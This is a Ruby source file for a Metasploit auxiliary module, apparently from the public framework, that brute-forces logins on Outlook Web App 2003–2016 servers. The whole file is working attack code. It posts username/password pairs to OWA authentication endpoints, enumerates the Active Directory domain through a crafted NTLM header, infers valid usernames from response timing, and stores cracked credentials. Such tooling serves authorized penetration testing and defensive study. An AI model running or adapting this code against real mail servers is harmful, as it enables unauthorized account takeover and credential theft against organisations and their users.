##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/ntlm/message'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner


  def initialize
    super(
      'Name'           => 'Outlook Web App (OWA) Brute Force Utility',
      'Description'    => %q{
        This module tests credentials on OWA 2003, 2007, 2010, 2013, and 2016 servers.
      },
      'Author'         =>
        [
          'Vitor Moreira',
          'Spencer McIntyre',
          'SecureState R&D Team',
          'sinn3r',
          'Brandon Knight',
          'Pete (Bokojan) Arzamendi', # Outlook 2013 updates
          'Nate Power',                # HTTP timing option
          'Chapman (R3naissance) Schleiss', # Save username in creds if response is less
          'Andrew Smith' # valid creds, no mailbox
        ],
      'License'        => MSF_LICENSE,
      'Actions'        =>
        [
          [
            'OWA_2003',
            {
              'Description' => 'OWA version 2003',
              'AuthPath'    => '/exchweb/bin/auth/owaauth.dll',
              'InboxPath'   => '/exchange/',
              'InboxCheck'  => /Inbox/
            }
          ],
          [
            'OWA_2007',
            {
              'Description' => 'OWA version 2007',
              'AuthPath'    => '/owa/auth/owaauth.dll',
              'InboxPath'   => '/owa/',
              'InboxCheck'  => /addrbook.gif/
            }
          ],
          [
            'OWA_2010',
            {
              'Description' => 'OWA version 2010',
              'AuthPath'    => '/owa/auth.owa',
              'InboxPath'   => '/owa/',
              'InboxCheck'  => /Inbox|location(\x20*)=(\x20*)"\\\/(\w+)\\\/logoff\.owa|A mailbox couldn\'t be found|\<a .+onclick="return JumpTo\('logoff\.aspx.+\">/
            }
          ],
          [
            'OWA_2013',
            {
              'Description' => 'OWA version 2013',
              'AuthPath'    => '/owa/auth.owa',
              'InboxPath'   => '/owa/',
              'InboxCheck'  => /Inbox|logoff\.owa/
            }
          ],
          [
            'OWA_2016',
            {
              'Description' => 'OWA version 2016',
              'AuthPath'    => '/owa/auth.owa',
              'InboxPath'   => '/owa/',
              'InboxCheck'  => /Inbox|logoff\.owa/
            }
          ]
        ],
      'DefaultAction' => 'OWA_2013',
      'DefaultOptions' => {
        'SSL' => true
      }
    )

    register_options(
      [
        OptInt.new('RPORT', [ true, "The target port", 443]),
        OptAddress.new('RHOST', [ true, "The target address" ]),
        OptBool.new('ENUM_DOMAIN', [ true, "Automatically enumerate AD domain using NTLM authentication", true]),
        OptBool.new('AUTH_TIME', [ false, "Check HTTP authentication response time", true])
      ])


    register_advanced_options(
      [
        OptString.new('AD_DOMAIN', [ false, "Optional AD domain to prepend to usernames", ''])
      ])

    deregister_options('BLANK_PASSWORDS', 'RHOSTS')
  end

  def setup
    # Here's a weird hack to check if each_user_pass is empty or not
    # apparently you cannot do each_user_pass.empty? or even inspect() it
    isempty = true
    each_user_pass do |user|
      isempty = false
      break
    end
    raise ArgumentError, "No username/password specified" if isempty
  end

  def run
    vhost = datastore['VHOST'] || datastore['RHOST']

    print_status("#{msg} Testing version #{action.name}")

    auth_path   = action.opts['AuthPath']
    inbox_path  = action.opts['InboxPath']
    login_check = action.opts['InboxCheck']

    domain = nil

    if datastore['AD_DOMAIN'] and not datastore['AD_DOMAIN'].empty?
      domain = datastore['AD_DOMAIN']
    end

    if ((datastore['AD_DOMAIN'].nil? or datastore['AD_DOMAIN'] == '') and datastore['ENUM_DOMAIN'])
      domain = get_ad_domain
    end

    begin
      each_user_pass do |user, pass|
        next if (user.blank? or pass.blank?)
        vprint_status("#{msg} Trying #{user} : #{pass}")
        try_user_pass({
          user: user,
          domain: domain,
          pass: pass,
          auth_path: auth_path,
          inbox_path: inbox_path,
          login_check: login_check,
          vhost: vhost
        })
      end
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
      print_error("#{msg} HTTP Connection Error, Aborting")
    end
  end

  def try_user_pass(opts)
    user = opts[:user]
    pass = opts[:pass]
    auth_path = opts[:auth_path]
    inbox_path = opts[:inbox_path]
    login_check = opts[:login_check]
    vhost = opts[:vhost]
    domain = opts[:domain]

    user = domain + '\\' + user if domain

    headers = {
      'Cookie' => 'PBack=0'
    }

    if datastore['SSL']
      if ["OWA_2013", "OWA_2016"].include?(action.name)
        data = 'destination=https://' << vhost << '/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << pass << '&isUtf8=1'
      else
        data = 'destination=https://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass
      end
    else
      if ["OWA_2013", "OWA_2016"].include?(action.name)
        data = 'destination=http://' << vhost << '/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << pass << '&isUtf8=1'
      else
        data = 'destination=http://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass
      end
    end

    begin
      if datastore['AUTH_TIME']
        start_time = Time.now
      end

      res = send_request_cgi({
        'encode'   => true,
        'uri'      => auth_path,
        'method'   => 'POST',
        'headers'  => headers,
        'data'     => data
      })

      if datastore['AUTH_TIME']
        elapsed_time = Time.now - start_time
      end
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("#{msg} HTTP Connection Failed, Aborting")
      return :abort
    end

    if not res
      print_error("#{msg} HTTP Connection Error, Aborting")
      return
    end

    if res.peerinfo['addr'] != datastore['RHOST']
      vprint_status("#{msg} Resolved hostname '#{datastore['RHOST']}' to address #{res.peerinfo['addr']}")
    end

    if !["OWA_2013", "OWA_2016"].include?(action.name) && res.get_cookies.empty?
        print_error("#{msg} Received invalid repsonse due to a missing cookie (possibly due to invalid version), aborting")
        return :abort
    end
    if ["OWA_2013", "OWA_2016"].include?(action.name)
      # Check for a response code to make sure login was valid. Changes from 2010 to 2013 / 2016
      # Check if the password needs to be changed.
      if res.headers['location'] =~ /expiredpassword/
        print_good("#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}': NOTE password change required")
        report_cred(
          ip: res.peerinfo['addr'],
          port: datastore['RPORT'],
          service_name: 'owa',
          user: user,
          password: pass
        )
        return :next_user
      end

      # No password change required moving on.
      # Check for valid login but no mailbox setup
      print_good("server type: #{res.headers["X-FEServer"]}")
      if res.headers['location'] =~ /owa/ and res.headers['location'] !~ /reason/
        print_good("#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}'")
        report_cred(
          ip: res.peerinfo['addr'],
          port: datastore['RPORT'],
          service_name: 'owa',
          user: user,
          password: pass
        )
        return :next_user
      end

      unless location = res.headers['location']
        print_error("#{msg} No HTTP redirect.  This is not OWA 2013 / 2016 system, aborting.")
        return :abort
      end
      reason = location.split('reason=')[1]
      if reason == nil
        headers['Cookie'] = 'PBack=0;' << res.get_cookies
      else
        # Login didn't work. no point in going on, however, check if valid domain account by response time.
        if elapsed_time <= 1
          unless user =~ /@\w+\.\w+/
            report_cred(
              ip: res.peerinfo['addr'],
              port: datastore['RPORT'],
              service_name: 'owa',
              user: user
            )
            print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
            return :Skip_pass
          end
        else
          vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (HTTP redirect with reason #{reason})")
          return :Skip_pass
        end
      end
    else
       # The authentication info is in the cookies on this response
      cookies = res.get_cookies
      cookie_header = 'PBack=0'
      %w(sessionid cadata).each do |necessary_cookie|
        if cookies =~ /#{necessary_cookie}=([^;]*)/
          cookie_header << "; #{Regexp.last_match(1)}"
        else
          print_error("#{msg} Missing #{necessary_cookie} cookie.  This is not OWA 2010, aborting")
          return :abort
        end
      end
      headers['Cookie'] = cookie_header
    end

    begin
      res = send_request_cgi({
        'uri'       => inbox_path,
        'method'    => 'GET',
        'headers'   => headers
      }, 20)
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("#{msg} HTTP Connection Failed, Aborting")
      return :abort
    end

    if not res
      print_error("#{msg} HTTP Connection Error, Aborting")
      return :abort
    end

    if res.redirect?
      if elapsed_time <= 1
        unless user =~ /@\w+\.\w+/
          report_cred(
            ip: res.peerinfo['addr'],
            port: datastore['RPORT'],
            service_name: 'owa',
            user: user
          )
          print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
          return :Skip_pass
        end
      else
        vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response was a #{res.code} redirect)")
        return :skip_pass
      end
    end

    if res.body =~ login_check
      print_good("#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}'")
      report_cred(
        ip: res.peerinfo['addr'],
        port: datastore['RPORT'],
        service_name: 'owa',
        user: user,
        password: pass
      )
      return :next_user
    else
      if elapsed_time <= 1
        unless user =~ /@\w+\.\w+/
          report_cred(
            ip: res.peerinfo['addr'],
            port: datastore['RPORT'],
            service_name: 'owa',
            user: user
          )
          print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
          return :Skip_pass
        end
      else
        vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response body did not match)")
        return :skip_pass
      end
    end
  end

  def get_ad_domain
    urls = ['aspnet_client',
      'Autodiscover',
      'ecp',
      'EWS',
      'Microsoft-Server-ActiveSync',
      'OAB',
      'PowerShell',
      'Rpc']

    domain = nil

    urls.each do |url|
      begin
        res = send_request_cgi({
          'encode'   => true,
          'uri'      => "/#{url}",
          'method'   => 'GET',
          'headers'  =>  {'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=='}
        })
      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
        vprint_error("#{msg} HTTP Connection Failed")
        next
      end

      if not res
        vprint_error("#{msg} HTTP Connection Timeout")
        next
      end

      if res && res.code == 401 && res.headers.has_key?('WWW-Authenticate') && res.headers['WWW-Authenticate'].match(/^NTLM/i)
        hash = res['WWW-Authenticate'].split('NTLM ')[1]
        domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/,'')
        print_good("Found target domain: #{domain}")
        return domain
      end
    end

    return domain
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    # Test if password was passed, if so, add private_data. If not, assuming only username was found
    if opts.has_key?(:password)
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: opts[:user],
        private_data: opts[:password],
        private_type: :password
      }.merge(service_data)
    else
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: opts[:user]
      }.merge(service_data)
    end

    login_data = {
      core: create_credential(credential_data),
      last_attempted_at: DateTime.now,
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def msg
    "#{vhost}:#{rport} OWA -"
  end
end
